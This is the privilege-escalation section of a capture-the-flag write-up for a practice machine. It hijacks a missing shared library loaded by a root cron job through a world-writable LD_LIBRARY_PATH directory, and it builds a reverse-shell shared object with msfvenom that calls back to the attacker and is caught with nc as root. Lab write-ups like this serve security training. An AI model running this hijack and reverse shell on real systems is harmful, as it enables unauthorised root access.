## Priv Esc

From crontab

```text
pablo@sybaris ~/tmp$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper
```

Note that crontab shows LD_LIBRARY_PATH includes a path we can write to **/usr/local/lib/dev**, and /usr/bin/log-sweeper is executed every min.

The file type is

```text
pablo@sybaris ~/tmp$ file /usr/bin/log-sweeper
/usr/bin/log-sweeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=b2507ccc8c1256db736f2a6c007d8993605e51fb, not stripped
```

Check which shared libraries are used by the binary

```text
pablo@sybaris ~/tmp$ ldd /usr/bin/log-sweeper
        linux-vdso.so.1 =>  (0x00007ffdac7c6000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f6d2bbfe000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f6d2bfcc000)
```

Note that it loads utils.so which isn't found. We can hijack that by placing it in the writable LD_LIBRARY_PATH folder. Get a reverse shell elf-so

```text
root@kali:~/CTF/PGPractice/Sybaris/PE# msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=6379 -f elf-so -o utils.so
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: utils.so
```

Put it in writable shared libraries path

```text
pablo@sybaris /usr/local/lib/dev$ chmod +x utils.so
pablo@sybaris /usr/local/lib/dev$ ls -lah
total 4.0K
drwxrwxrwx  2 root  root   22 Jun 19 07:25 .
drwxr-xr-x. 4 root  root   30 Sep  7  2020 ..
-rwxrwxr-x  1 pablo pablo 476 Jun 19 07:23 utils.so
```

Wait a min and we see

```text
root@kali:~/CTF/PGPractice/Sybaris/PE# nc -nlvp 6379
listening on [any] 6379 ...
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.93] 56084
id
uid=0(root) gid=0(root) groups=0(root)
```

